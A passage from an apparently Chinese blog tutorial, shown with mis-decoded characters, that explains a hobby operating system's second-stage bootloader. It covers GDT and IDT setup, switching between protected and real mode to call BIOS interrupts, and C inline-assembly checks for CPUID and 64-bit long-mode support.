‡</span></span><br><span class="line">    clear_screen(VGADP_DFVL);<span class="comment">//æ¸…é™¤å±å¹•</span></span><br><span class="line">    write_realintsvefile(); </span><br><span class="line">    write_ldrkrlfile(); </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸»è¦ä½œç”¨æ˜¯,æ¸…æ¥šå±å¹•ï¼Œç„¶åæ‰¾åˆ°inithead.binï¼Œinitldrkrl.binçš„æ–‡ä»¶å¤´æè¿°ç¬¦,å¹¶å°†å…¶ä»æ˜ åƒæ–‡ä»¶ä¸­åŠ è½½åˆ°å…¶åº”è¯¥å»çš„åœ°å€ã€‚å…¶ä¸­<code>write_ldrkrlfile();</code>å‡½æ•°å°†äºŒçº§å¼•å¯¼å™¨ä¸»æ¨¡å—åŠ è½½åˆ°äº†0x200000çš„åœ°å€ï¼Œä»¥ä¾›ä¸Šé¢çš„32bits_modeè·³è½¬åˆ°è¯¥æ¨¡å—ã€‚</p><h1 id="è¿›å…¥äºŒçº§å¼•å¯¼å™¨"><a href="#è¿›å…¥äºŒçº§å¼•å¯¼å™¨" class="headerlink" title="è¿›å…¥äºŒçº§å¼•å¯¼å™¨"></a>è¿›å…¥äºŒçº§å¼•å¯¼å™¨</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">global realadr_call_entry</span><br><span class="line">global IDT_PTR</span><br><span class="line">extern ldrkrl_entry</span><br><span class="line">[section .text]</span><br><span class="line">[bits 32]</span><br><span class="line">_start:</span><br><span class="line">_entry:</span><br><span class="line">cli</span><br><span class="line">lgdt [GDT_PTR];åŠ è½½GDTRå¯„å­˜å™¨ï¼ŒGDT æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒåŒ…å«äº†å„ç§æ®µæè¿°ç¬¦ï¼Œä¾‹å¦‚ä»£ç æ®µã€æ•°æ®æ®µã€ç³»ç»Ÿæ®µç­‰ã€‚æ¯ä¸ªæè¿°ç¬¦å®šä¹‰äº†ä¸€ä¸ªå†…å­˜æ®µçš„å±æ€§ï¼Œå¦‚åŸºåœ°å€ã€æ®µé™åˆ¶ã€ç‰¹æƒçº§ç­‰ã€‚</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line"></span><br><span class="line">lidt [IDT_PTR];åŠ è½½IDTRå¯„å­˜å™¨ï¼ŒIDT æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼ŒåŒ…å«äº†ä¸­æ–­å’Œå¼‚å¸¸å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ã€‚æ¯ä¸ªä¸­æ–­æˆ–å¼‚å¸¸å¯¹åº”ä¸€ä¸ªæè¿°ç¬¦ï¼Œå…¶ä¸­åŒ…å«äº†å¤„ç†ç¨‹åºçš„åœ°å€å’Œç‰¹æƒçº§ã€‚</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Base Address  (32 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">;|   Limit         (16 bits)         |</span><br><span class="line">;+-----------------+------------------+</span><br><span class="line">jmp dword 0x8 :_32bits_mode</span><br><span class="line"></span><br><span class="line">_32bits_mode:</span><br><span class="line">mov ax, 0x10; æ•°æ®æ®µé€‰æ‹©å­(ç›®çš„)ï¼Œ0000 0000 0001 0000ï¼Œç´¢å¼•ä¸º2ï¼Œ32ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">mov ds, ax</span><br><span class="line">mov ss, ax</span><br><span class="line">mov es, ax</span><br><span class="line">mov fs, ax</span><br><span class="line">mov gs, ax</span><br><span class="line">xor eax,eax</span><br><span class="line">xor ebx,ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor edi,edi</span><br><span class="line">xor esi,esi</span><br><span class="line">xor ebp,ebp</span><br><span class="line">xor esp,esp</span><br><span class="line">mov esp,0x90000</span><br><span class="line">call ldrkrl_entry</span><br><span class="line">xor ebx,ebx</span><br><span class="line">jmp 0x2000000</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;æ­¤æ—¶æ ˆåº•æ˜¯å‚¨å­˜çš„æ˜¯callæŒ‡ä»¤æ‰§è¡Œæ—¶ä¿å­˜çš„eipæ—¢&quot;pop gs&quot;è¿™æ¡æŒ‡ä»¤çš„åœ°å€</span><br><span class="line">mov [PM32_EIP_OFF],esi;ä¿å­˜eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;ä¿å­˜esp</span><br><span class="line">jmp dword far [cpmty_mode] ;é•¿è·³è½¬è¿™é‡Œè¡¨ç¤ºæŠŠcpmty_modeå¤„çš„ç¬¬ä¸€ä¸ª4å­—èŠ‚è£…å…¥eipï¼ŒæŠŠå…¶åçš„2å­—èŠ‚è£…å…¥csï¼Œè·³è½¬åˆ°çš„ä»£ç æ–‡ä»¶åœ¨realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,æœ€åä¸‰ä½æ˜¯RPLå’ŒTIï¼Œéƒ½ä¸º0 ï¼Œç´¢å¼•æ˜¯3ï¼Œ;16ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">jmp $</span><br><span class="line"></span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0;ä¸€ä¸ªç©ºæè¿°ç¬¦ï¼Œç”¨äºä¿æŠ¤æ¨¡å¼ä¸‹çš„é”™è¯¯æ£€æŸ¥ã€‚</span><br><span class="line">kcode_dsc: dq 0x00cf9a000000ffff ;32ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff ;32ä½æ•°æ®æ®µæè¿°ç¬¦ã€‚</span><br><span class="line">k16cd_dsc: dq 0x00009a000000ffff ;16ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff ;16ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">GDT_END:</span><br><span class="line"></span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLENdw GDT_END-GDT_START-1;GDTç•Œé™</span><br><span class="line">GDTBASEdd GDT_START ;GDT çš„åŸºåœ°å€</span><br><span class="line"></span><br><span class="line">IDT_PTR:</span><br><span class="line">IDTLENdw 0x3ff; IDT çš„é•¿åº¦ï¼Œè¿™é‡Œè®¾ç½®ä¸º 0x3ffï¼Œå³ 1023ã€‚</span><br><span class="line">IDTBASdd 0; IDT çš„åŸºåœ°å€ï¼Œè¿™é‡Œè®¾ç½®ä¸º 0ï¼Œè¿™æ˜¯BIOSä¸­æ–­è¡¨çš„åœ°å€</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ–‡ä»¶çš„startå‡½æ•°å°±æ˜¯ä¹‹å‰è¦è·³è½¬çš„ä½ç½®ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸»è¦å¹²çš„å†…å®¹å’Œä¹‹å‰ä¸€æ ·ï¼Œå°±æ˜¯å¯¹å„ä¸ªå¯„å­˜å™¨ï¼Œä»¥åŠå †æ ˆè¿›è¡Œåˆå§‹åŒ–è·³è½¬åˆ°ldrkrl_entryå‡½æ•°ï¼Œè¿™é‡Œå…ˆä¸è°ˆldrkrl_entryå‡½æ•°ï¼Œè¿™ä¸ªldrkrl_entryæ˜¯äºŒçº§å¼•å¯¼å™¨çš„ä¸»å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åé¢çš„éƒ¨åˆ†ï¼Œå› ä¸ºåé¢è¿™äº›åŠŸèƒ½æ˜¯ä¸ºæˆ‘ä»¬ä¸»å‡½æ•°æœåŠ¡çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦è°ƒç”¨biosä¸­æ–­ï¼ŒCè¯­è¨€ä»£ç å·¥ä½œåœ¨32ä½ä¿æŠ¤æ¨¡å¼ï¼Œè¦è°ƒç”¨biosè¦ä½¿ç”¨å®æ¨¡å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆå®ç°ä¸€ä¸ªrealadr_call_entryå‡½æ•°æ¥å¸®åŠ©æˆ‘ä»¬çš„ä¸»å‡½æ•°å»è°ƒç”¨biosä¸­æ–­ã€‚</p><h1 id="realadr-call-entryå‡½æ•°"><a href="#realadr-call-entryå‡½æ•°" class="headerlink" title="realadr_call_entryå‡½æ•°"></a>realadr_call_entryå‡½æ•°</h1><p>æˆ‘ä»¬å…ˆçœ‹çœ‹realadr_call_entryå‡½æ•°åœ¨cé‡Œçš„å®šä¹‰<code>void REGCALL realadr_call_entry(u16_t callint,u16_t val1,u16_t val2);//eax edx ecx</code>å…¶ä¸­<strong>REGCALL</strong>æ˜¯ä¸€ä¸ªå®å®šä¹‰<code>#define REGCALL __attribute__((regparm(3)))//è¡¨ç¤ºä¼šç”¨ 3 ä¸ªå¯„å­˜å™¨æ¥ä¼ é€’å‚æ•°ï¼ˆEAXã€EDX å’Œ ECXï¼‰ï¼Œå…¶ä½™çš„å‚æ•°é€šè¿‡å †æ ˆæ¥ä¼ é€’ã€‚</code>ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬è°ƒç”¨realadr_call_entryå‡½æ•°çš„æ—¶å€™ä¼šå°†ä¸‰ä¸ªå‚æ•°ä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“æ±‡ç¼–è¯­è¨€çš„å‡½æ•°æ˜¯æ²¡æœ‰ä¼ å‚çš„è¯´æ³•çš„ï¼Œè¿™é‡Œçš„æ“ä½œé‡ç‚¹æ˜¯æ”¹å˜EAXã€EDX å’Œ ECXä¸‰ä¸ªå¯„å­˜å™¨ï¼Œé€šè¿‡æ¯”å¯¹ä¸åŒçš„eaxå¯„å­˜å™¨çš„å€¼æ¥è·³è½¬åˆ°ä¸åŒçš„å‡½æ•°ï¼Œæˆ‘ä»¬ä¸‹é¢æ¥çœ‹çœ‹è¿™ä¸€è¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">realadr_call_entry:</span><br><span class="line">pushad</span><br><span class="line">push    ds</span><br><span class="line">push    es</span><br><span class="line">push    fs</span><br><span class="line">push    gs</span><br><span class="line">call save_eip_jmp</span><br><span class="line">popgs</span><br><span class="line">popfs</span><br><span class="line">popes</span><br><span class="line">popds</span><br><span class="line">popad</span><br><span class="line">ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">pop esi ;æ­¤æ—¶æ ˆåº•æ˜¯å‚¨å­˜çš„æ˜¯callæŒ‡ä»¤æ‰§è¡Œæ—¶ä¿å­˜çš„eipæ—¢&quot;pop gs&quot;è¿™æ¡æŒ‡ä»¤çš„åœ°å€</span><br><span class="line">mov [PM32_EIP_OFF],esi;ä¿å­˜eip</span><br><span class="line">mov [PM32_ESP_OFF],esp;ä¿å­˜esp</span><br><span class="line">jmp dword far [cpmty_mode] ;é•¿è·³è½¬è¿™é‡Œè¡¨ç¤ºæŠŠcpmty_modeå¤„çš„ç¬¬ä¸€ä¸ª4å­—èŠ‚è£…å…¥eipï¼ŒæŠŠå…¶åçš„2å­—èŠ‚è£…å…¥csï¼Œè·³è½¬åˆ°çš„ä»£ç æ–‡ä»¶åœ¨realintsve.asm</span><br><span class="line">cpmty_mode:</span><br><span class="line">dd 0x1000;EIP</span><br><span class="line">dw 0x18;CS 0000 0000 0001 1000,æœ€åä¸‰ä½æ˜¯RPLå’ŒTIï¼Œéƒ½ä¸º0 ï¼Œç´¢å¼•æ˜¯3ï¼Œ;16ä½ä»£ç æ®µæè¿°ç¬¦ï¼Œè®¿é—®ä½ a-e</span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure><p>realadr_call_entryä¿å­˜æ®µå¯„å­˜å™¨åï¼Œè·³è½¬åˆ°äº†save_eip_jmpï¼Œå½“æˆ‘ä»¬ä½¿ç”¨callæŒ‡ä»¤åä¼šå°†è¿”å›åè¦è·³è½¬çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬ä¿å­˜è¿™ä¸€åœ°å€ï¼Œå¹¶ä¿ç•™å…¶å †æ ˆåœ°å€ï¼Œç„¶åé€šè¿‡é•¿è·³è½¬è·³è½¬åˆ°16ä½ä»£ç æ®µæè¿°ç¬¦æ‰€è®°å½•çš„æ®µï¼Œè¯¦ç»†åˆ°æ®µå†…åœ°å€æ˜¯åç§»0x1000çš„åœ°å€ï¼Œå…³äºè¿™ä¸ªåœ°å€çš„ä»£ç å°±åƒä¸‹å›¾æ‰€ç¤º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;ldrasm.inc&quot;</span><br><span class="line">global _start</span><br><span class="line">[section .text]</span><br><span class="line">[bits 16]</span><br><span class="line">_start:</span><br><span class="line">_16_mode:</span><br><span class="line">    mov bp, 0x20 ;0000 0000 0010 0000ï¼Œç´¢å¼•ä¸º4ï¼Œ16ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    and ebp, 0xfffffffe</span><br><span class="line">    mov cr0, ebp ;CR0.P=0 å…³é—­ä¿æŠ¤æ¨¡å¼</span><br><span class="line">    jmp 0:real_entry ;åˆ·æ–°CSå½±å­å¯„å­˜å™¨ï¼ŒçœŸæ­£è¿›å…¥å®æ¨¡å¼</span><br><span class="line">real_entry:</span><br><span class="line">    mov bp,cs</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov es, bp</span><br><span class="line">    mov ss, bp</span><br><span class="line">    mov sp, 08000h ;è®¾ç½®æ ˆé¡¶</span><br><span class="line">    mov bp, func_table</span><br><span class="line">    add bp, ax</span><br><span class="line">    call [bp] ;è°ƒç”¨å‡½æ•°è¡¨ä¸­çš„æ±‡ç¼–å‡½æ•°ï¼Œaxæ˜¯Cå‡½æ•°(ä½¿ç”¨realadr_call_entryç¬¦å·ä¼ é€’å‚æ•°)ä¸­ä¼ é€’è¿›æ¥çš„ï¼Œæ ¹æ®ä¸åŒçš„eaxæ¥æ§åˆ¶è°ƒç”¨ä¸åŒå‡½æ•°</span><br><span class="line">    cli</span><br><span class="line">    call disable_nmi</span><br><span class="line">    mov ebp, cr0</span><br><span class="line">    or ebp, 1</span><br><span class="line">    mov cr0, ebp ;CR0.P=1 å¼€å¯ä¿æŠ¤æ¨¡å¼</span><br><span class="line">    jmp dword 0x8 : _32bits_mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[bits 32]</span><br><span class="line">_32bits_mode:</span><br><span class="line">    mov bp, 0x10;0000 0000 0001 0000ï¼Œç´¢å¼•ä¸º2ï¼Œ32ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">    mov ds, bp</span><br><span class="line">    mov ss, bp ;é‡æ–°è®¾ç½®ä¿æŠ¤æ¨¡å¼ä¸‹çš„æ®µå¯„å­˜å™¨ä¸º32ä½æ•°æ®æ®µæè¿°ç¬¦</span><br><span class="line">mov esi,[PM32_EIP_OFF]</span><br><span class="line">mov esp,[PM32_ESP_OFF]</span><br><span class="line">jmp esi</span><br><span class="line"></span><br><span class="line">func_table: ;å‡½æ•°è¡¨ï¼Œæ¯é¡¹å ä¸¤ä¸ªå­—èŠ‚</span><br><span class="line">dw _getmmap;è·å–å†…å­˜å¸ƒå±€è§†å›¾çš„å‡½æ•°</span><br><span class="line">dw _read ;è¯»å–ç¡¬ç›˜çš„å‡½æ•°</span><br><span class="line">    dw _getvbemode ;è·å–æ˜¾å¡VBEæ¨¡å¼</span><br><span class="line">    dw _getvbeonemodeinfo ;è·å–æ˜¾å¡VBEæ¨¡å¼çš„æ•°æ®</span><br><span class="line">    dw _setvbemode ;è®¾ç½®æ˜¾å¡VBEæ¨¡å¼</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çœå»äº†è¦è·³è½¬çš„å‡ ä¸ªå‡½æ•°çš„åŠŸèƒ½å®ç°ï¼Œå…¶å®è¿™å‡ ä¸ªä»£ç çš„åŠŸèƒ½éƒ½æ˜¯ä»biosä¸­æ–­ä¸­è·å–æ•°æ®æœ€åä¿å­˜èµ·æ¥ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ä¸Šé¢çš„éƒ¨åˆ†ï¼Œä¾æ—§æ˜¯è®¾å®šæ®µé€‰æ‹©å­åˆ°16ä½æ•°æ®æ®µæè¿°ç¬¦ï¼Œç„¶åå…³é—­ä¿æŠ¤æ¨¡å¼è¿›å…¥å®æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯real_entryçš„éƒ¨åˆ†ï¼Œæœ€ä¸ºé‡ç‚¹çš„æ˜¯<code>call [bp] ;</code>è¿™æ®µä»£ç ï¼Œè¿™é‡Œé€šè¿‡å…ˆå°†func_tableçš„åœ°å€ä¼ å…¥bpå¯„å­˜å™¨ï¼Œç„¶åå› ä¸ºä¼ å…¥çš„axä¸åŒï¼Œ<code>add bp, ax</code>çš„ç»“æœä¸åŒï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼æ¥å‘Šè¯‰real_entryå‡½æ•°åé¢è¿›å…¥å“ªä¸ªå‡½æ•°ã€‚è°ƒç”¨å®Œå‡½æ•°ä¼šå›åˆ°real_entryï¼Œç„¶åå…³ä¸­æ–­å¼€å¯ä¿æŠ¤æ¨¡å¼ï¼Œé‡æ–°è®¾ç½®å¯„å­˜å™¨ï¼Œå›åˆ°ä¹‹å‰çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯realadr_call_entryçš„<code>pop     gs</code>è¿™ä¸€è¡Œã€‚</p><h1 id="init-bstartparmå‡½æ•°"><a href="#init-bstartparmå‡½æ•°" class="headerlink" title="init_bstartparmå‡½æ•°"></a>init_bstartparmå‡½æ•°</h1><p>æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦å®Œå–„ä¸Šé¢æåˆ°çš„ldrkrl_entryå‡½æ•°äº†ï¼Œå¦‚æœ ldrkrl_entry() å‡½æ•°æ˜¯æ€»è£ï¼Œé‚£ä¹ˆ init_bstartparm() å‡½æ•°åˆ™æ˜¯ç»ç†ï¼Œå®ƒè´Ÿè´£ç®¡ç†æ£€æŸ¥ CPU æ¨¡å¼ã€æ”¶é›†å†…å­˜ä¿¡æ¯ï¼Œè®¾ç½®å†…æ ¸æ ˆï¼Œè®¾ç½®å†…æ ¸å­—ä½“ã€å»ºç«‹å†…æ ¸ MMU é¡µè¡¨æ•°æ®ã€‚ä¸‹é¢æˆ‘ä»¬ç›´æ¥æ¥çœ‹init_bstartparmå‡½æ•°çš„å®ç°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_bstartparm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">machbstart_t</span>* mbsp = MBSPADR;<span class="comment">//1MBçš„å†…å­˜åœ°å€</span></span><br><span class="line">    machbstart_t_init(mbsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬è¦å…ˆåœ¨0x100000çš„åœ°å€åˆå§‹åŒ–äº†ä¸€ä¸ªæœºå™¨ä¿¡æ¯ç»“æ„ machbstart_tç”¨äºå‚¨å­˜æˆ‘ä»¬çš„ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">machbstart_t_init</span><span class="params">(<span class="keyword">machbstart_t</span>* initp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(initp,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">machbstart_t</span>));</span><br><span class="line">    initp-&gt;mb_migc=MBS_MIGC;<span class="comment">//è®¾ç½®é­”æ•°</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åé¢æˆ‘ä»¬åœ¨è¯¥å‡½æ•°ä¸­åŠ å…¥å„ç§æ”¶é›†ä¿¡æ¯çš„å‡½æ•°ã€‚</p><h2 id="æ£€æµ‹cpuæ˜¯å¦æ”¯æŒ"><a href="#æ£€æµ‹cpuæ˜¯å¦æ”¯æŒ" class="headerlink" title="æ£€æµ‹cpuæ˜¯å¦æ”¯æŒ"></a>æ£€æµ‹cpuæ˜¯å¦æ”¯æŒ</h2><p>å†å¼€å§‹æ”¶é›†ä¿¡æ¯ä¹‹å‰æˆ‘ä»¬å…ˆå¯¹cpuè¿›è¡Œä¸€ä¸ªæ£€æµ‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_chkcpu</span><span class="params">(<span class="keyword">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!chk_cpuid())<span class="comment">//æ£€æµ‹cpuidåŠŸèƒ½æ˜¯å¦æ”¯æŒ</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support CPUID sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!chk_cpu_longmode())<span class="comment">//æ£€æµ‹æ˜¯å¦æ”¯æŒé•¿æ¨¡å¼</span></span><br><span class="line">    &#123;</span><br><span class="line">        kprint(<span class="string">&quot;Your CPU is not support 64bits mode sys is die!&quot;</span>);</span><br><span class="line">        CLI_HALT();</span><br><span class="line">    &#125;</span><br><span class="line">    mbsp-&gt;mb_cpumode = <span class="number">64</span>;<span class="comment">//å¦‚æœæˆåŠŸåˆ™è®¾ç½®æœºå™¨ä¿¡æ¯ç»“æ„çš„cpuæ¨¡å¼ä¸º64ä½</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡æ”¹å†™EFLAGSå¯„å­˜å™¨çš„ç¬¬21ä½ï¼Œè§‚å¯Ÿå…¶ä½çš„å˜åŒ–åˆ¤æ–­æ˜¯å¦æ”¯æŒCPUID,å…·ä½“è¿‡ç¨‹ä¸‹é¢éƒ½æœ‰æ³¨é‡Š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpuid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>;</span><br><span class="line">    __asm__ __volatile__(<span class="comment">//__volatile__ç¡®ä¿æ¯æ¬¡è®¿é—®è¯¥å˜é‡æ—¶éƒ½ç›´æ¥ä»å†…å­˜ä¸­è¯»å–æˆ–å†™å…¥å€¼ï¼Œè€Œä¸æ˜¯ä»å¯„å­˜å™¨æˆ–å…¶ä»–ç¼“å­˜ä¸­è·å–ã€‚</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//EFLAGSå¯„å­˜å™¨å‹æ ˆ</span></span><br><span class="line">        <span class="string">&quot;pop %%eax \n\t&quot;</span><span class="comment">//å°†EFLAGSä¿å­˜åˆ°eaxä¸­</span></span><br><span class="line">        <span class="string">&quot;movl %%eax,%%ebx \n\t&quot;</span><span class="comment">//å°†EAXå¯„å­˜å™¨çš„å€¼å¤åˆ¶åˆ°EBXå¯„å­˜å™¨ä¸­ï¼Œç”¨äºä¹‹åçš„æ¯”è¾ƒ</span></span><br><span class="line">        <span class="string">&quot;xorl $0x0200000,%%eax \n\t&quot;</span><span class="comment">//å¯¹EAXå¯„å­˜å™¨çš„å€¼è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œæ”¹å˜å…¶ç¬¬21ä½çš„å€¼</span></span><br><span class="line">        <span class="string">&quot;pushl %%eax \n\t&quot;</span><span class="comment">//å°†ä¿®æ”¹åçš„EAXå€¼å‹å›æ ˆä¸­</span></span><br><span class="line">        <span class="string">&quot;popfl \n\t&quot;</span><span class="comment">//å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºåˆ°EFLAGSå¯„å­˜å™¨ä¸­ï¼Œæ›´æ–°EFLAGSçš„å€¼</span></span><br><span class="line">        <span class="string">&quot;pushfl \n\t&quot;</span><span class="comment">//å†æ¬¡å°†EFLAGSçš„å€¼å‹å…¥æ ˆä¸­</span></span><br><span class="line">        <span class="string">&quot;popl %%eax \n\t&quot;</span><span class="comment">//å°†æ ˆé¡¶çš„å€¼å¼¹å‡ºåˆ°EAXå¯„å­˜å™¨ä¸­</span></span><br><span class="line">        <span class="string">&quot;xorl %%ebx,%%eax \n\t&quot;</span><span class="comment">//å°†EBXå’ŒEAXå¯„å­˜å™¨çš„å€¼è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œç”¨äºæ£€æµ‹EFLAGSçš„ç¬¬21ä½æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–</span></span><br><span class="line">        <span class="string">&quot;jz 1f \n\t&quot;</span><span class="comment">//å¦‚æœç»“æœä¸º0ï¼ˆå³ç¬¬21ä½æ²¡æœ‰å˜åŒ–ï¼‰ï¼Œè·³è½¬åˆ°æ ‡ç­¾1</span></span><br><span class="line">        <span class="string">&quot;movl $1,%0 \n\t&quot;</span><span class="comment">//ç»™retsèµ‹å€¼ä¸º0</span></span><br><span class="line">        <span class="string">&quot;jmp 2f \n\t&quot;</span><span class="comment">//è·³è½¬åˆ°2æ ‡ç­¾</span></span><br><span class="line">        <span class="string">&quot;1:movl $0,%0 \n\t&quot;</span><span class="comment">//ç»™retsèµ‹å€¼ä¸º1</span></span><br><span class="line">        <span class="string">&quot;2: \n\t&quot;</span><span class="comment">//</span></span><br><span class="line">        :<span class="string">&quot;=c&quot;</span>(rets)</span><br><span class="line">        :</span><br><span class="line">        :</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> rets;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ£€æŸ¥CPUæ˜¯å¦æ”¯æŒé•¿æ¨¡å¼</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_cpu_longmode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rets = <span class="number">0</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå˜é‡retsï¼Œç”¨æ¥å­˜å‚¨æ£€æµ‹ç»“æœï¼Œåˆå§‹åŒ–ä¸º0</span></span><br><span class="line">    __asm__ __volatile__(</span><br><span class="line">        <span class="string">&quot;movl $0x80000000,%%eax \n\t&quot;</span> <span class="comment">// å°†0x80000000ç§»åŠ¨åˆ°EAXå¯„å­˜å™¨ä¸­</span></span><br><span class="line">        <span class="string">&quot;cpuid \n\t&quot;</span> <span class="comment">// æ‰§è¡ŒCPUIDæŒ‡ä»¤ï¼ŒCPUIDæŒ‡ä»¤ä¼šæ ¹æ®EAXå¯„å­˜å™¨çš„å€¼è¿”å›ä¸åŒçš„ä¿¡æ¯ï¼Œå½“EAXä¸º0x80000000æ—¶ï¼Œæ‰§è¡ŒCPUIDæŒ‡ä»¤åï¼ŒEAXå¯„å­˜å™¨ä¼šè¿”å›ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼æ˜¯CPUæ”¯æŒçš„æœ€å¤§æ‰©å±•åŠŸèƒ½å·ã€‚å¦‚æœè¿™ä¸ªè¿”å›å€¼å¤§äº0x80000000ï¼Œé‚£ä¹ˆå°±è¡¨ç¤ºCPUæ”¯æŒä¸€ç³»åˆ—æ‰©å±•åŠŸèƒ½</span></span><br><span class="line">        <span class="string">&quot;cmpl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// æ¯”è¾ƒEAXå¯„å­˜å™¨çš„å€¼å’Œ0x80000001ï¼Œå¦‚æœEAXå°äº0x80000001ï¼Œé‚£ä¹ˆå¤„ç†å™¨ä¸æ”¯æŒ0x80000001å·åŠŸèƒ½</span></span><br><span class="line">        <span class="string">&quot;setnb %%al \n\t&quot;</span> <span class="comment">// Set Byte if Not Belowï¼ˆå¦‚æœä¸ä½äºåˆ™è®¾ç½®å­—èŠ‚ï¼‰ï¼Œå¦‚æœEAXå¤§äºæˆ–ç­‰äº0x80000001ï¼Œå°†ALè®¾ç½®ä¸º1</span></span><br><span class="line">        <span class="string">&quot;jb 1f \n\t&quot;</span> <span class="comment">// å¦‚æœEAXå°äº0x80000001ï¼Œè·³è½¬åˆ°æ ‡ç­¾1</span></span><br><span class="line">        <span class="string">&quot;movl $0x80000001,%%eax \n\t&quot;</span> <span class="comment">// 